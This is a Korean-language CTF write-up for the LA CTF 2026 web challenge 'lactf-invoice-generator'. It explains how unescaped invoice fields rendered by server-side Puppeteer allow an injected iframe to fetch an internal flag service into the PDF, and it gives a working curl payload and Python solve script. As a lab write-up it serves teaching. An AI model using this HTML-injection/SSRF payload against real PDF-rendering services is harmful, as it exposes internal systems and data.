---
title: "[Web] lactf-invoice-generator"
description: Writeup for "lactf-invoice-generator" from LA CTF 2026.
date: 2026-02-10 01:00:00 +0900
categories: [CTF, LA CTF 2026]
tags: [Web]
toc: true
comments: false
render_with_liquid: false
---

# lactf-invoice-generator (LA CTF 2026)

---

- **Name:** lactf-invoice-generator
- **Category:** Web
- **Connection:** `https://<INSTANCE>`
- **Flag format:** `lactf{...}`

---

### 개요

청구서(invoice)를 생성해주는 서비스입니다.
사용자가 항목을 입력하면, 서버가 HTML 청구서를 만들고
헤드리스 Chrome(Puppeteer)으로 렌더링해서 PDF로 반환합니다.

서비스 구성은 두 개입니다.

| 서비스 | 접근 가능 여부 |
|--------|---------------|
| `invoice-generator` | 외부에서 접근 가능 |
| `flag` (`http://flag:8081/flag`) | 내부 네트워크 전용 |

플래그는 외부에서 직접 열 수 없는 내부 서비스에 있습니다.
하지만 서버 내부의 Puppeteer는 내부 네트워크에 접근할 수 있습니다.

---

### 소스 분석

#### HTML 생성 부분

청구서 HTML이 어떻게 만들어지는지 살펴봅니다.

```js
function generateInvoiceHTML(name, item, cost, datePurchased) {
  return `
    <html>
      <body>
        <h1>Invoice</h1>
        <p>Name: ${name}</p>
        <p>Item: ${item}</p>
        <p>Cost: ${cost}</p>
        <p>Date: ${datePurchased}</p>
      </body>
    </html>
  `;
}
```

`item` 파라미터가 템플릿 리터럴에 **그대로** 삽입됩니다.
이스케이프도 없고, sanitization도 없습니다.

여기에 `<iframe>`을 넣으면 HTML에 그대로 박힙니다.

#### PDF 렌더링 부분

```js
const browser = await puppeteer.launch();
const page = await browser.newPage();
await page.setContent(html);                     // 우리가 만든 HTML 로드
const pdf = await page.pdf({ format: "A4" });    // PDF로 변환
```

Puppeteer는 서버 내부에서 실행되므로,
HTML에 `http://flag:8081/flag` 같은 내부 URL이 있어도
**실제 브라우저처럼 접근해서 렌더링합니다.**

---

### 취약점 분석

두 가지가 맞물립니다.

**1. 입력값이 HTML에 무방비하게 삽입됨:**
`item` 필드에 어떤 HTML 태그든 넣을 수 있습니다.

**2. Puppeteer가 내부 네트워크에 접근 가능:**
렌더링 주체가 서버 내부의 헤드리스 브라우저이므로,
외부에서 막혀 있는 `http://flag:8081/flag`도 로드할 수 있습니다.

그러면 `item` 필드에 내부 URL을 가리키는 `<iframe>`을 넣으면 어떻게 될까요?

```
1. item에 <iframe src="http://flag:8081/flag"> 삽입
2. 서버가 HTML 생성 → iframe 태그가 그대로 포함됨
3. Puppeteer가 HTML 렌더링 → iframe 로드 시도
4. 서버 내부에서 실행되므로 flag 서비스에 접근 성공
5. flag 페이지 내용이 iframe에 표시된 채로 PDF 저장
6. PDF에서 플래그 추출
```

---

### Exploit 실행 과정

**Step 1 — iframe 페이로드로 PDF 생성**

```bash
curl -s -X POST "https://<INSTANCE>/generate-invoice" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "test",
    "item": "<iframe src=\"http://flag:8081/flag\" style=\"width:900px;height:300px\"></iframe>",
    "cost": "1",
    "datePurchased": "2026-01-01"
  }' --output invoice.pdf
```

`style`로 iframe 크기를 충분히 키워야 PDF에서 내용이 잘립니다.

**Step 2 — PDF에서 플래그 추출**

```bash
sudo apt-get install -y poppler-utils
pdftotext invoice.pdf - | grep -o 'lactf{[^}]*}'
```

실행 결과:

```
lactf{plz_s4n1t1z3_y0ur_purch4s3_l1st}
```

---

### Exploit 코드 (Python)

```python
#!/usr/bin/env python3
import argparse, re, subprocess, sys
from urllib.parse import urljoin
import requests

# 내부 flag 서비스를 가리키는 iframe
PAYLOAD = (
    '<iframe src="http://flag:8081/flag"'
    ' style="width:900px;height:300px"></iframe>'
)
FLAG_RE = re.compile(r"lactf\{[^}]+\}")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="예: https://<INSTANCE>")
    ap.add_argument("--out", default="invoice.pdf")
    args = ap.parse_args()

    # PDF 생성
    r = requests.post(
        urljoin(args.base.rstrip("/") + "/", "generate-invoice"),
        json={
            "name": "test",
            "item": PAYLOAD,
            "cost": "1",
            "datePurchased": "2026-01-01",
        },
        timeout=30,
    )
    r.raise_for_status()

    with open(args.out, "wb") as f:
        f.write(r.content)
    print(f"[+] 저장됨: {args.out}")

    # PDF에서 플래그 추출
    try:
        text = subprocess.check_output(
            ["pdftotext", args.out, "-"],
            stderr=subprocess.STDOUT,
        ).decode(errors="ignore")
    except FileNotFoundError:
        sys.exit("[!] pdftotext 없음. 설치: sudo apt-get install -y poppler-utils")

    m = FLAG_RE.search(text)
    print(f"[+] FLAG: {m.group(0)}" if m else "[!] PDF에서 플래그를 찾지 못했습니다")

if __name__ == "__main__":
    main()
```

**실행 방법:**

```bash
python3 solve.py --base "https://<INSTANCE>"
```

---

### FLAG

```
lactf{plz_s4n1t1z3_y0ur_purch4s3_l1st}
```

---

### 요약

이 문제의 핵심은 **헤드리스 브라우저의 네트워크 위치**입니다.

사용자 입력이 HTML에 무방비하게 삽입되는 것 자체도 취약점이지만,
Puppeteer가 서버 내부 네트워크에서 실행된다는 점이 결정적입니다.

외부에서는 절대 열 수 없는 `http://flag:8081/flag`를,
서버 안에 있는 Puppeteer는 아무 제약 없이 로드합니다.
`<iframe>` 하나로 그 내용을 PDF에 포함시키면 끝입니다.

헤드리스 브라우저를 사용하는 서비스에서
사용자 입력을 HTML에 그대로 넣는 것은 단순한 XSS를 넘어,
내부 서비스 노출(SSRF)로 이어질 수 있습니다.
